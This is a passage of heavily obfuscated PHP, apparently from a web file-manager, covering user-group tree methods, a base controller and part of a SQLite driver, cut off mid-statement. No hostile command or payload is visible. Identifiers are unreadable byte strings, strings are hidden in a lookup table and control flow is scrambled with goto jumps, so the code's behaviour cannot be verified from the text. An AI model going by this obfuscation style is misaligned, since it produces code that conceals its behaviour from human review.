$_SERVER[¹Ò‹Ò¹]; $FªÖÉÙ‡Ëİ = $aÚ„£œÖ‰[$E¡¶ºÑÕ“ù[1752]]; $a©„ä±Äá = isset($aÚ„£œÖ‰[$E¡¶ºÑÕ“ù[1753]]) ? $aÚ„£œÖ‰[$E¡¶ºÑÕ“ù[1753]] : !1; goto Fôê­õ•Ëë; A…ƒĞÊŞ¶Ø: return $AÒéˆëÏæ˜; goto F–¥»ê©³; Fôê­õ•Ëë: if (!trim($FªÖÉÙ‡Ëİ)) { return !1; } $FªÖÉÙ‡Ëİ = str_replace($E¡¶ºÑÕ“ù[1754], $E¡¶ºÑÕ“ù[1755], $FªÖÉÙ‡Ëİ); $bº„ñ¿˜› = array($E¡¶ºÑÕ“ù[1667] => array($E¡¶ºÑÕ“ù[378], "{$FªÖÉÙ‡Ëİ}\45"), $E¡¶ºÑÕ“ù[28] => array($E¡¶ºÑÕ“ù[378], "\x25{$FªÖÉÙ‡Ëİ}\45"), $E¡¶ºÑÕ“ù[933] => $E¡¶ºÑÕ“ù[1756]); goto c¹Ô×à¬ÍÂ; F–¥»ê©³: } protected function groupChildrenAll($fõ¬ˆ™¢†²) { $B¾ê³¯ö÷œ =& $_SERVER[¹Ò‹Ò¹]; if (!$fõ¬ˆ™¢†²) { return !1; } if (is_string($fõ¬ˆ™¢†²)) { $fõ¬ˆ™¢†² = array($fõ¬ˆ™¢†²); } $Eç°òË•àÔ = $fõ¬ˆ™¢†²; foreach ($fõ¬ˆ™¢†² as $Aò§Ì¡­“‚) { $eˆ¾Ä½ºù = $this->getInfoSimple($Aò§Ì¡­“‚); $F‘É¿«´ = array($B¾ê³¯ö÷œ[481] => array($B¾ê³¯ö÷œ[378], $eˆ¾Ä½ºù[$B¾ê³¯ö÷œ[481]] . $Aò§Ì¡­“‚ . $B¾ê³¯ö÷œ[508])); $b¿œ•±°ğº = $this->field($B¾ê³¯ö÷œ[1667])->where($F‘É¿«´)->select(); $Eç°òË•àÔ = array_merge($Eç°òË•àÔ, array_to_keyvalue($b¿œ•±°ğº, $B¾ê³¯ö÷œ[33], $B¾ê³¯ö÷œ[1667])); } return array_unique($Eç°òË•àÔ); } private function _searchFromMeta($AÊÃ´¢ùÏÕ, $F²»Š¢Œ‚‡, $bÆ§ò×Ó, $Eƒ˜Œñ¨³‰) { goto CòÜŠííïÓ; CòÜŠííïÓ: $Fé¡ŸÆ÷Ïî =& $_SERVER[¹Ò‹Ò¹]; $F²»Š¢Œ‚‡ = strtolower($F²»Š¢Œ‚‡); $cÊòÌø¬‘ = array($Fé¡ŸÆ÷Ïî[92] => $AÊÃ´¢ùÏÕ, $Fé¡ŸÆ÷Ïî[370] => array($Fé¡ŸÆ÷Ïî[378], "\x25{$F²»Š¢Œ‚‡}\x25")); goto A›Šãã©ÌÅ; eÜ»¹¸’‘İ: if (!$bäÔà÷ï´æ) { return array(); } $bäÔà÷ï´æ = array_to_keyvalue($bäÔà÷ï´æ, $Fé¡ŸÆ÷Ïî[33], $Fé¡ŸÆ÷Ïî[1667]); $bâ¬Œèå = $this->where(array($Fé¡ŸÆ÷Ïî[1747] => array($Fé¡ŸÆ÷Ïî[7], $bäÔà÷ï´æ)))->select(); goto A‡º‚Õ…”µ; A‡º‚Õ…”µ: if (!$bâ¬Œèå) { return array(); } return $bâ¬Œèå; goto c ×ØÈÊ¹‹; A›Šãã©ÌÅ: $cÊòÌø¬‘ = $this->parseWhereLike($cÊòÌø¬‘); if ($Eƒ˜Œñ¨³‰) { $cÊòÌø¬‘[$Fé¡ŸÆ÷Ïî[1667]] = array($Fé¡ŸÆ÷Ïî[7], $Eƒ˜Œñ¨³‰); } $bäÔà÷ï´æ = Model($Fé¡ŸÆ÷Ïî[1757])->where($cÊòÌø¬‘)->limit($bÆ§ò×Ó)->select(); goto eÜ»¹¸’‘İ; c ×ØÈÊ¹‹: } protected function _listDataApplyItem($EÖÑ¨®ª) { $e’ÀÔİÈ£ß = array($EÖÑ¨®ª); $this->_listDataApply($e’ÀÔİÈ£ß); return $e’ÀÔİÈ£ß[0]; } protected function _listDataApply(&$fœÎòçÇ°) { goto FÊ¿÷§¡œ¸; a«•Ò¥‹: $this->_listAppendChildren($fœÎòçÇ°); $this->_listAppendChildrenMember($fœÎòçÇ°); $this->_listAppendMeta($fœÎòçÇ°, $Céó½º•õ°); goto bíÕ¥Şè½; bíÕ¥Şè½: $this->_listAppendParent($fœÎòçÇ°); $this->_listAppendSourceRoot($fœÎòçÇ°, $Céó½º•õ°); goto c‡Œ“©ÀÓá; FÊ¿÷§¡œ¸: $A‰İğïì =& $_SERVER[¹Ò‹Ò¹]; if (!$fœÎòçÇ°) { return; } $Céó½º•õ° = array_to_keyvalue($fœÎòçÇ°, $A‰İğïì[33], $A‰İğïì[1667]); goto a«•Ò¥‹; c‡Œ“©ÀÓá: } private function _listAppendChildren(&$A¢§×êŠ©Õ) { goto aˆì¸Ë´È“; aˆì¸Ë´È“: $EÔî®³Œ—ª =& $_SERVER[¹Ò‹Ò¹]; $e¦‹ØŸ½Ç° = array_to_keyvalue($A¢§×êŠ©Õ, $EÔî®³Œ—ª[33], $EÔî®³Œ—ª[1667]); $A–°ˆ£¹Ş = array($EÔî®³Œ—ª[472] => array($EÔî®³Œ—ª[7], $e¦‹ØŸ½Ç°)); goto F¡Ù£Üã²è; F¡Ù£Üã²è: $e ¯¼Ğ¿‹Â = array($EÔî®³Œ—ª[472], $EÔî®³Œ—ª[1758] => $EÔî®³Œ—ª[474]); $aùŞ°È¡ÙÆ = $this->field($e ¯¼Ğ¿‹Â)->where($A–°ˆ£¹Ş)->group($EÔî®³Œ—ª[472])->select(); $e´ ”²­‰ƒ = array_to_keyvalue($aùŞ°È¡ÙÆ, $EÔî®³Œ—ª[472], $EÔî®³Œ—ª[474]); goto F¨ºÀ×È®; F¨ºÀ×È®: foreach ($A¢§×êŠ©Õ as &$Fƒò¿ëí”í) { $E‹Ğâ’â’­ = $Fƒò¿ëí”í[$EÔî®³Œ—ª[1667]]; $Fƒò¿ëí”í[$EÔî®³Œ—ª[1759]] = isset($e´ ”²­‰ƒ[$E‹Ğâ’â’­]) ? intval($e´ ”²­‰ƒ[$E‹Ğâ’â’­]) : !1; } unset($Fƒò¿ëí”í); goto d…Ş¢ĞÀ‚; d…Ş¢ĞÀ‚: } private function _listAppendChildrenMember(&$eæêèí´‘Æ) { goto DÚïÆƒÛø; c¤«¤«ÄÛî: foreach ($eæêèí´‘Æ as &$dïÊ½îËø‰) { $DÚñ‘óµ… = $dïÊ½îËø‰[$bŒ¾¬¼¨ƒÌ[1667]]; $dïÊ½îËø‰[$bŒ¾¬¼¨ƒÌ[1760]] = isset($cä°´¡İ²Ş[$DÚñ‘óµ…]) ? intval($cä°´¡İ²Ş[$DÚñ‘óµ…]) : !1; } unset($dïÊ½îËø‰); goto D×¢ËĞ®Èá; EÑ¥á“ìæ‘: $C–­ºÄˆ…Ö = array($bŒ¾¬¼¨ƒÌ[1667], $bŒ¾¬¼¨ƒÌ[1758] => $bŒ¾¬¼¨ƒÌ[474]); $eâ»®Î’Ï = Model($bŒ¾¬¼¨ƒÌ[1750])->field($C–­ºÄˆ…Ö)->where($Bç„ò¸¡óƒ)->group($bŒ¾¬¼¨ƒÌ[1667])->select(); $cä°´¡İ²Ş = array_to_keyvalue($eâ»®Î’Ï, $bŒ¾¬¼¨ƒÌ[1667], $bŒ¾¬¼¨ƒÌ[474]); goto c¤«¤«ÄÛî; DÚïÆƒÛø: $bŒ¾¬¼¨ƒÌ =& $_SERVER[¹Ò‹Ò¹]; $C˜¥å¹…«¡ = array_to_keyvalue($eæêèí´‘Æ, $bŒ¾¬¼¨ƒÌ[33], $bŒ¾¬¼¨ƒÌ[1667]); $Bç„ò¸¡óƒ = array($bŒ¾¬¼¨ƒÌ[1667] => array($bŒ¾¬¼¨ƒÌ[7], $C˜¥å¹…«¡)); goto EÑ¥á“ìæ‘; D×¢ËĞ®Èá: } private function _listAppendMeta(&$c‘ôˆö…åª, $bøò‚…ÂõŒ) { goto eÚì ¢”‹š; eÚì ¢”‹š: $dçº¾½ôôö =& $_SERVER[¹Ò‹Ò¹]; $AéœÌ“‘‹ = array($dçº¾½ôôö[1667] => array($dçº¾½ôôö[7], $bøò‚…ÂõŒ)); $f‰È…²é…ê = Model($dçº¾½ôôö[1749])->where($AéœÌ“‘‹)->select(); goto cÛ”ºÉÏ´ê; cÛ”ºÉÏ´ê: $f‰È…²é…ê = array_to_keyvalue_group($f‰È…²é…ê, $dçº¾½ôôö[1667]); foreach ($f‰È…²é…ê as &$f­îÌ‚âÓ) { $f­îÌ‚âÓ = array_to_keyvalue($f­îÌ‚âÓ, $dçº¾½ôôö[92], $dçº¾½ôôö[370]); } unset($f­îÌ‚âÓ); goto EŞÓØ‘´ğì; EŞÓØ‘´ğì: foreach ($c‘ôˆö…åª as &$CùİÃ”ßÎï) { $CùİÃ”ßÎï[$dçº¾½ôôö[439]] = array(); if (isset($f‰È…²é…ê[$CùİÃ”ßÎï[$dçº¾½ôôö[1667]]])) { $CùİÃ”ßÎï[$dçº¾½ôôö[439]] = $f‰È…²é…ê[$CùİÃ”ßÎï[$dçº¾½ôôö[1667]]]; } } unset($CùİÃ”ßÎï); goto E–Æò˜í»; E–Æò˜í»: } protected function parentLevelArray($bâ†’Ô„£¥) { $BÎÕ‘ÄŞ«‚ =& $_SERVER[¹Ò‹Ò¹]; $bâ†’Ô„£¥ = explode($BÎÕ‘ÄŞ«‚[47], trim($bâ†’Ô„£¥, $BÎÕ‘ÄŞ«‚[47])); $bâ†’Ô„£¥ = array_remove_value($bâ†’Ô„£¥, $BÎÕ‘ÄŞ«‚[491]); return $bâ†’Ô„£¥; } private function _listAppendParent(&$e£¶óÂøã©) { goto bî×ÔŒ‚•; bî×ÔŒ‚•: $dš·—ŞÚÖç =& $_SERVER[¹Ò‹Ò¹]; $eçøŞ˜ŞÑĞ = array(); foreach ($e£¶óÂøã© as &$B‘Ğƒ¶Àì) { $eçøŞ˜ŞÑĞ[$B‘Ğƒ¶Àì[$dš·—ŞÚÖç[1667]]] = $B‘Ğƒ¶Àì[$dš·—ŞÚÖç[28]]; $A÷±àòùÜ = $this->parentLevelArray($B‘Ğƒ¶Àì[$dš·—ŞÚÖç[481]]); foreach ($A÷±àòùÜ as $e®‰©Ñœç) { if (!isset($eçøŞ˜ŞÑĞ[$e®‰©Ñœç])) { $eçøŞ˜ŞÑĞ[$e®‰©Ñœç] = 0; } } } goto C¾õœ„Ûë; Bâ³‰˜¢µ–: if ($GLOBALS[$dš·—ŞÚÖç[479]] == $dš·—ŞÚÖç[86]) { $EäĞæÄ‡ƒ… = !1; } foreach ($e£¶óÂøã© as &$B‘Ğƒ¶Àì) { $A÷±àòùÜ = $this->parentLevelArray($B‘Ğƒ¶Àì[$dš·—ŞÚÖç[481]]); $FÑÓ™¬Ì¶ = $dš·—ŞÚÖç[33]; foreach ($A÷±àòùÜ as $d…Ï¹Ëß¶ => $e®‰©Ñœç) { if ($EäĞæÄ‡ƒ… && $d…Ï¹Ëß¶ == 0) { continue; } $FÑÓ™¬Ì¶ .= $eçøŞ˜ŞÑĞ[$e®‰©Ñœç] . $dš·—ŞÚÖç[8]; } if ($A÷±àòùÜ) { $FÑÓ™¬Ì¶ .= $B‘Ğƒ¶Àì[$dš·—ŞÚÖç[28]]; } $B‘Ğƒ¶Àì[$dš·—ŞÚÖç[485]] = str_replace($dš·—ŞÚÖç[490], $dš·—ŞÚÖç[8], $FÑÓ™¬Ì¶); } unset($B‘Ğƒ¶Àì); goto F˜¿Á¯¨•æ; C¾õœ„Ûë: unset($B‘Ğƒ¶Àì); foreach ($eçøŞ˜ŞÑĞ as $d…Ï¹Ëß¶ => $c‘¼ŞÙ»ãƒ) { if ($c‘¼ŞÙ»ãƒ) { continue; } $CÃï¶”êê = $this->getInfoSimple($d…Ï¹Ëß¶); $eçøŞ˜ŞÑĞ[$d…Ï¹Ëß¶] = $CÃï¶”êê[$dš·—ŞÚÖç[28]]; } $EäĞæÄ‡ƒ… = $GLOBALS[$dš·—ŞÚÖç[6]][$dš·—ŞÚÖç[87]][$dš·—ŞÚÖç[1761]]; goto Bâ³‰˜¢µ–; F˜¿Á¯¨•æ: } private function _listAppendSourceRoot(&$D“ï¨—öµ¥, $CÕÈ¦‚çÈ) { goto c‰Í°ÙñŸÊ; F“·ô›Ö¨»: foreach ($D“ï¨—öµ¥ as &$aÇÚÊº¢¯§) { $aÇÚÊº¢¯§[$D±šçå®±ˆ[84]] = $eÒİ‘ãÌÍŠ[$aÇÚÊº¢¯§[$D±šçå®±ˆ[1667]]] ? $eÒİ‘ãÌÍŠ[$aÇÚÊº¢¯§[$D±šçå®±ˆ[1667]]] : array(); } unset($aÇÚÊº¢¯§); goto f—÷™¯ğ‰ğ; B‡ÒİÀ¶ÛÒ: $eÒİ‘ãÌÍŠ = Model($D±šçå®±ˆ[769])->order($D±šçå®±ˆ[1763])->field($CŠè„¡¢Ûà)->where($E²ìİ‰õ‘õ)->select(); $eÒİ‘ãÌÍŠ = array_to_keyvalue($eÒİ‘ãÌÍŠ, $D±šçå®±ˆ[478]); $eÒİ‘ãÌÍŠ = array_remove_key($eÒİ‘ãÌÍŠ, $D±šçå®±ˆ[478]); goto F“·ô›Ö¨»; c‰Í°ÙñŸÊ: $D±šçå®±ˆ =& $_SERVER[¹Ò‹Ò¹]; $E²ìİ‰õ‘õ = array($D±šçå®±ˆ[398] => SourceModel::TYPE_GROUP, $D±šçå®±ˆ[472] => 0, $D±šçå®±ˆ[478] => array($D±šçå®±ˆ[7], $CÕÈ¦‚çÈ)); $CŠè„¡¢Ûà = $D±šçå®±ˆ[1762]; goto B‡ÒİÀ¶ÛÒ; f—÷™¯ğ‰ğ: } protected function groupMerge($Fªïí½Ïê®) { $Fªïí½Ïê® = array_values(array_unique($Fªïí½Ïê®)); $dç›ãíÎë´ = array(); for ($C®âğ‚ÎÛå = 0; $C®âğ‚ÎÛå < count($Fªïí½Ïê®); $C®âğ‚ÎÛå++) { $F—ìŒË’”Ä = !1; for ($A‘×Ì“ÏÍ = 0; $A‘×Ì“ÏÍ < count($Fªïí½Ïê®); $A‘×Ì“ÏÍ++) { if ($C®âğ‚ÎÛå == $A‘×Ì“ÏÍ) { continue; } if ($this->isParentOf($Fªïí½Ïê®[$A‘×Ì“ÏÍ], $Fªïí½Ïê®[$C®âğ‚ÎÛå])) { $F—ìŒË’”Ä = !0; break; } } if (!$F—ìŒË’”Ä) { $dç›ãíÎë´[] = $Fªïí½Ïê®[$C®âğ‚ÎÛå]; } } return $dç›ãíÎë´; } protected function isParentOf($cŸæ£ëá, $a„ìÇ¦ÃÚ) { goto añÂ‘³ùÅ; b†¹ÈËÕˆÛ: return !1; goto eØ‰ç›‡…Û; fšââË”°¬: $f÷Ôî¿àÓå = $this->getInfoSimple($a„ìÇ¦ÃÚ); $FÒ¯õİ£Ç± = $eœÃˆöÉä˜[$dï ¾ÎÇ§É[481]] . $cŸæ£ëá . $dï ¾ÎÇ§É[47]; if (substr($f÷Ôî¿àÓå[$dï ¾ÎÇ§É[481]], 0, strlen($FÒ¯õİ£Ç±)) == $FÒ¯õİ£Ç±) { return !0; } goto b†¹ÈËÕˆÛ; añÂ‘³ùÅ: $dï ¾ÎÇ§É =& $_SERVER[¹Ò‹Ò¹]; if (!$cŸæ£ëá || !$a„ìÇ¦ÃÚ || $cŸæ£ëá == $a„ìÇ¦ÃÚ) { return !1; } $eœÃˆöÉä˜ = $this->getInfoSimple($cŸæ£ëá); goto fšââË”°¬; eØ‰ç›‡…Û: } public function groupShowRoot($F–Õ–¸¿ÃÃ, $aí‰ò³Šë = false) { goto dÊŒ¤å‹ğ; b¶„óªç°†: if ($aí‰ò³Šë && count($C¢‚¸‚ßô—) == 1) { return $e­°²½–; } if (!$F‚¨Ñ°÷[$EËã…×¿º„[439]] || !isset($F‚¨Ñ°÷[$EËã…×¿º„[439]][$EËã…×¿º„[1745]]) || $F‚¨Ñ°÷[$EËã…×¿º„[439]][$EËã…×¿º„[1745]] == $EËã…×¿º„[1718]) { return $this->groupShowRoot($C¢‚¸‚ßô—[count($C¢‚¸‚ßô—) - 1], $aí‰ò³Šë); } if ($F‚¨Ñ°÷[$EËã…×¿º„[439]][$EËã…×¿º„[1745]] == $EËã…×¿º„[355]) { $A‹êƒñ…©ö = explode($EËã…×¿º„[47], $F‚¨Ñ°÷[$EËã…×¿º„[439]][$EËã…×¿º„[1746]]); if ($A‹êƒñ…©ö) { $e­°²½– = array_merge($e­°²½–, $A‹êƒñ…©ö); } } goto B˜è­¥¢¬İ; B˜è­¥¢¬İ: return $e­°²½–; goto eö‰Œ¶Âë; a“æîêœÈ¶: $C¢‚¸‚ßô— = $this->parentLevelArray($F‚¨Ñ°÷[$EËã…×¿º„[481]]); $e­°²½– = array($F–Õ–¸¿ÃÃ); if (count($C¢‚¸‚ßô—) == 0) { return $e­°²½–; } goto b¶„óªç°†; dÊŒ¤å‹ğ: $EËã…×¿º„ =& $_SERVER[¹Ò‹Ò¹]; $F‚¨Ñ°÷ = $this->getInfo($F–Õ–¸¿ÃÃ); if (!$F‚¨Ñ°÷) { return array(); } goto a“æîêœÈ¶; eö‰Œ¶Âë: } protected function resetParentLevel() { $dŸÇÓßè‹ğ =& $_SERVER[¹Ò‹Ò¹]; $b‹Ëœ›Ûí = $dŸÇÓßè‹ğ[1667]; $E¤Š’á„â = $this->select(); $E¤Š’á„â = array_to_keyvalue($E¤Š’á„â, $b‹Ëœ›Ûí); foreach ($E¤Š’á„â as $Cã‘à¸ÙÈ×) { goto C®ÙÇ»ˆËŒ; D‰–óôÅÌ˜: $aÌÑÍƒéÈ[] = 0; $aÌÑÍƒéÈ = $dŸÇÓßè‹ğ[47] . implode($dŸÇÓßè‹ğ[47], array_reverse($aÌÑÍƒéÈ)) . $dŸÇÓßè‹ğ[47]; $this->setNamePinyin($Cã‘à¸ÙÈ×[$b‹Ëœ›Ûí], $Cã‘à¸ÙÈ×[$dŸÇÓßè‹ğ[28]]); goto A¤ÀõòÛ¾; A¤ÀõòÛ¾: $this->where(array($b‹Ëœ›Ûí => $Cã‘à¸ÙÈ×[$b‹Ëœ›Ûí]))->save(array($dŸÇÓßè‹ğ[548] => $aÌÑÍƒéÈ)); goto bÔØè¤«ª; C®ÙÇ»ˆËŒ: $Fğñ«éì—¥ = $Cã‘à¸ÙÈ×; $aÌÑÍƒéÈ = array(); while ($Fğñ«éì—¥[$dŸÇÓßè‹ğ[472]] != 0) { $aÌÑÍƒéÈ[] = $Fğñ«éì—¥[$dŸÇÓßè‹ğ[472]]; $Fğñ«éì—¥ = $E¤Š’á„â[$Fğñ«éì—¥[$dŸÇÓßè‹ğ[472]]]; } goto D‰–óôÅÌ˜; bÔØè¤«ª: } return $E¤Š’á„â; } public function groupNameAuto($Fä´Œ­…, $AàôäåØ†¹) { $aÎ¦•…´°• =& $_SERVER[¹Ò‹Ò¹]; $d›…«æš«š = $this->where(array($aÎ¦•…´°•[389] => $Fä´Œ­…))->getField($aÎ¦•…´°•[28], !0); if (!$d›…«æš«š || !in_array($AàôäåØ†¹, $d›…«æš«š)) { return $AàôäåØ†¹; } for ($AŒ¤±¡ö§Ï = 1; $AŒ¤±¡ö§Ï <= count($d›…«æš«š) + 1; $AŒ¤±¡ö§Ï++) { $cÏáŸ ƒ¡¤ = $AàôäåØ†¹ . "\50{$AŒ¤±¡ö§Ï}\x29"; if (!in_array($cÏáŸ ƒ¡¤, $d›…«æš«š)) { return $cÏáŸ ƒ¡¤; } } } public function groupSwitch($F·ŠŒùœ´´, $Bµ¼”²„Æ¶) { goto bÃ‘”½Œ“±; b¡ñº¹²: $CÕ¨Ç†æê’ = array_to_keyvalue($CÕ¨Ç†æê’, $aãá‚‘«Û³[1667]); if (!isset($CÕ¨Ç†æê’[$F·ŠŒùœ´´]) || !isset($CÕ¨Ç†æê’[$Bµ¼”²„Æ¶]) || $CÕ¨Ç†æê’[$F·ŠŒùœ´´][$aãá‚‘«Û³[472]] == 0) { return !1; } $F†§‰È½¸É = array($aãá‚‘«Û³[1667] => $F·ŠŒùœ´´); goto BÁ÷÷ê˜É²; bÃ‘”½Œ“±: $aãá‚‘«Û³ =& $_SERVER[¹Ò‹Ò¹]; $F†§‰È½¸É = array($aãá‚‘«Û³[1667] => array($aãá‚‘«Û³[7], array($F·ŠŒùœ´´, $Bµ¼”²„Æ¶))); $CÕ¨Ç†æê’ = $this->where($F†§‰È½¸É)->select(); goto b¡ñº¹²; c´Ï„¡šÛà: $this->where(array($aãá‚‘«Û³[472] => $F·ŠŒùœ´´))->save(array($aãá‚‘«Û³[472] => $Bµ¼”²„Æ¶)); return !0; goto E™¤ñ‘¢’ä; BÁ÷÷ê˜É²: $fÄ“¾ª²® = Model($aãá‚‘«Û³[1750])->where($F†§‰È½¸É)->select(); if (!$fÄ“¾ª²®) { $fÄ“¾ª²® = array(); } foreach ($fÄ“¾ª²® as $AœÓ’Ü¼Åƒ) { $Dìğ…¹ÜÙ³ = $AœÓ’Ü¼Åƒ[$aãá‚‘«Û³[1504]]; $F†§‰È½¸É = array($aãá‚‘«Û³[1504] => $Dìğ…¹ÜÙ³, $aãá‚‘«Û³[1667] => $Bµ¼”²„Æ¶); $A¡‘Úˆ§¶ƒ = Model($aãá‚‘«Û³[1750])->where($F†§‰È½¸É)->find(); if (!$A¡‘Úˆ§¶ƒ) { $eªğùëêáÀ = array($Bµ¼”²„Æ¶ => $AœÓ’Ü¼Åƒ[$aãá‚‘«Û³[1764]]); Model($aãá‚‘«Û³[501])->userGroupAdd($Dìğ…¹ÜÙ³, $eªğùëêáÀ); } Model($aãá‚‘«Û³[501])->userGroupRemove($Dìğ…¹ÜÙ³, $F·ŠŒùœ´´); } goto B“¬ÕÚ”÷è; E˜æÏ±ĞŸ: $cã—‚›Ô­ = !empty($AÙÔéÈÒèÏ[$F·ŠŒùœ´´]) ? $AÙÔéÈÒèÏ[$F·ŠŒùœ´´] : !1; if ($cã—‚›Ô­) { goto EÑ¢¢Š™¤²; c™ì öĞƒè: $fÀ‰§Œåò– = array($aãá‚‘«Û³[478] => $Bµ¼”²„Æ¶); Model($aãá‚‘«Û³[1767])->where($F†§‰È½¸É)->save($fÀ‰§Œåò–); Model($aãá‚‘«Û³[1768])->where($F†§‰È½¸É)->save($fÀ‰§Œåò–); goto a¤ÄÒ³ÆÔ; céÍÅê÷Ü: foreach ($AÙÔéÈÒèÏ as $a’Š‡‡ĞÕ‡) { $bÔŠ„±ø® = $a’Š‡‡ĞÕ‡[$aãá‚‘«Û³[397]] == $aãá‚‘«Û³[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($aãá‚‘«Û³[769])->move($a’Š‡‡ĞÕ‡[$aãá‚‘«Û³[390]], $F’ôÇîêÊ‹, $bÔŠ„±ø®); } Model($aãá‚‘«Û³[769])->moveClearAuth = !0; $F†§‰È½¸É = array($aãá‚‘«Û³[398] => 2, $aãá‚‘«Û³[478] => $F·ŠŒùœ´´); goto c™ì öĞƒè; EÑ¢¢Š™¤²: if (!$AÙÔéÈÒèÏ[$Bµ¼”²„Æ¶]) { $AÙÔéÈÒèÏ[$Bµ¼”²„Æ¶] = Model($aãá‚‘«Û³[769])->groupRootAdd($Bµ¼”²„Æ¶); } $F’ôÇîêÊ‹ = $AÙÔéÈÒèÏ[$Bµ¼”²„Æ¶]; $F†§‰È½¸É = array($aãá‚‘«Û³[472] => $cã—‚›Ô­); goto CŸ®Â×åíÓ; CŸ®Â×åíÓ: $AÙÔéÈÒèÏ = Model($aãá‚‘«Û³[769])->where($F†§‰È½¸É)->field($aãá‚‘«Û³[1766])->select(); if (!$AÙÔéÈÒèÏ) { $AÙÔéÈÒèÏ = array(); } Model($aãá‚‘«Û³[769])->moveClearAuth = !1; goto céÍÅê÷Ü; a¤ÄÒ³ÆÔ: } $this->_changeChildLevel($CÕ¨Ç†æê’[$F·ŠŒùœ´´], $CÕ¨Ç†æê’[$Bµ¼”²„Æ¶], !0); goto c´Ï„¡šÛà; B“¬ÕÚ”÷è: $F†§‰È½¸É = array($aãá‚‘«Û³[398] => 2, $aãá‚‘«Û³[472] => 0, $aãá‚‘«Û³[397] => 1, $aãá‚‘«Û³[478] => array($aãá‚‘«Û³[7], array($F·ŠŒùœ´´, $Bµ¼”²„Æ¶))); $AÙÔéÈÒèÏ = Model($aãá‚‘«Û³[769])->where($F†§‰È½¸É)->field($aãá‚‘«Û³[1765])->select(); $AÙÔéÈÒèÏ = array_to_keyvalue($AÙÔéÈÒèÏ, $aãá‚‘«Û³[478], $aãá‚‘«Û³[390]); goto E˜æÏ±ĞŸ; E™¤ñ‘¢’ä: } } goto b›‹âĞšÜ¾; fŠİ©†¹‚æ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Dš˜…±°ç; e·Š†¢¨îŠ: $this->tpl = TEMPLATE . MOD . $a£éÑò÷[8]; $this->_classObjectID = mt_rand(0, 10000); goto Cóï‹çÅªÖ; Dš˜…±°ç: $a£éÑò÷ =& $_SERVER[¹Ò‹Ò¹]; global $in, $config; $this->config =& $config; goto Bóô¹ëÛµ¶; Bóô¹ëÛµ¶: $this->in =& $in; $this->values[$a£éÑò÷[6]] =& $config; $this->values[$a£éÑò÷[7]] =& $in; goto e·Š†¢¨îŠ; Cóï‹çÅªÖ: } public function loadClass($CƒÉàÕÌ‹ô) { if (1 === func_num_args()) { $this->{$CƒÉàÕÌ‹ô} = new $CƒÉàÕÌ‹ô(); } else { $aÃ¥ğ…ğµæ = new ReflectionClass($CƒÉàÕÌ‹ô); $C¦ÈïéïÒï = func_get_args(); array_shift($C¦ÈïéïÒï); $this->{$CƒÉàÕÌ‹ô} = $aÃ¥ğ…ğµæ->newInstanceArgs($C¦ÈïéïÒï); } return $this->{$CƒÉàÕÌ‹ô}; } protected function assign($fÏ¹«æĞ¹, $f¨˜ñ™¦§) { $this->values[$fÏ¹«æĞ¹] = $f¨˜ñ™¦§; } protected function display($B²Ê›–Â¢é) { ob_end_clean(); extract($this->values); require $this->tpl . $B²Ê›–Â¢é; } } class DbSqliteBase extends Db { public function __construct($cóŒ¶Î¢Ô± = '') { $cÙ‰†¬ëäĞ =& $_SERVER[¹Ò‹Ò¹]; if (!extension_loaded($cÙ‰†¬ëäĞ[9])) { think_exception(think_lang($cÙ‰†¬ëäĞ[10]) . $cÙ‰†¬ëäĞ[11]); } if (!empty($cóŒ¶Î¢Ô±)) { if (!isset($cóŒ¶Î¢Ô±[$cÙ‰†¬ëäĞ[12]])) { $cóŒ¶Î¢Ô±[$cÙ‰†¬ëäĞ[12]] = 438; } $this->config = $cóŒ¶Î¢Ô±; if (empty($this->config[$cÙ‰†¬ëäĞ[13]])) { $this->config[$cÙ‰†¬ëäĞ[13]] = array(); } } } public function connect($b† áŞÈÌ® = '', $F½¼à¶ƒœ = 0) { $CÀ×ôƒ¥‚¢ =& $_SERVER[¹Ò‹Ò¹]; if (!isset($this->linkID[$F½¼à¶ƒœ])) { goto bîƒ‰ ¬Œ²; bîƒ‰ ¬Œ²: if (empty($b† áŞÈÌ®)) { $b† áŞÈÌ® = $this->config; } $d»»Åä® = !empty($b† áŞÈÌ®[$CÀ×ôƒ¥‚¢[13]][$CÀ×ôƒ¥‚¢[14]]) ? $b† áŞÈÌ®[$CÀ×ôƒ¥‚¢[13]][$CÀ×ôƒ¥‚¢[14]] : $this->pconnect; $DÜÊé‰‘Œ´ = $d»»Åä® ? $CÀ×ôƒ¥‚¢[15] : $CÀ×ôƒ¥‚¢[16]; goto dÃÒì‘Ò; dÃÒì‘Ò: $this->linkID[$F½¼à¶ƒœ] = $DÜÊé‰‘Œ´($b† áŞÈÌ®[$CÀ×ôƒ¥‚¢[17]], $b† áŞÈÌ®[$CÀ×ôƒ¥‚¢[12]]); if (!$this->linkID[$F½¼à¶ƒœ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto AÏæ…¹Ì²´; AÏæ…¹Ì²´: @sqlite_busy_timeout($this->linkID[$F½¼à¶ƒœ], 30000); if (1 != think_config($CÀ×ôƒ¥‚¢[18])) { unset($this->config); } goto A ¸êÄë; A ¸êÄë: } return $this->linkID[$F½¼à¶ƒœ]; } public function free() { $this->queryID = null; } public function query($CŸ¾Œ‡’÷š) { goto b÷õ±¯†äŠ; b÷õ±¯†äŠ: $A»©¬‰ä­ =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÇ¯ÏÚªİŒ; cŸôÏÍÌˆ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $aŞ®‹›Œß = $this->getAll(); return $aŞ®‹›Œß; } goto féˆÆ•²Å; BÇ¯ÏÚªİŒ: $this->queryStr = $CŸ¾Œ‡’÷š; if ($this->queryID) { $this->free(); } think_action_status($A»©¬‰ä­[19], 1); goto cÎ‚”æèà; cÎ‚”æèà: think_status($A»©¬‰ä­[20]); $this->queryID = sqlite_query($this->_linkID, $CŸ¾Œ‡’÷š); $this->debug(); goto cŸôÏÍÌˆ; féˆÆ•²Å: } public function execute($cŠöÇÍï) { goto b°ÜË£Öº“; b°ÜË£Öº“: $F©¾¿³ì¨» =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bëá‚´ä˜; bëá‚´ä˜: $this->queryStr = $cŠöÇÍï; if ($this->queryID) { $this->free(); } think_action_status($F©¾¿³ì¨»[21], 1); goto FÁÔÊ½÷¦‚; FÁÔÊ½÷¦‚: think_status($F©¾¿³ì¨»[20]); $dÅ›É·”­ = 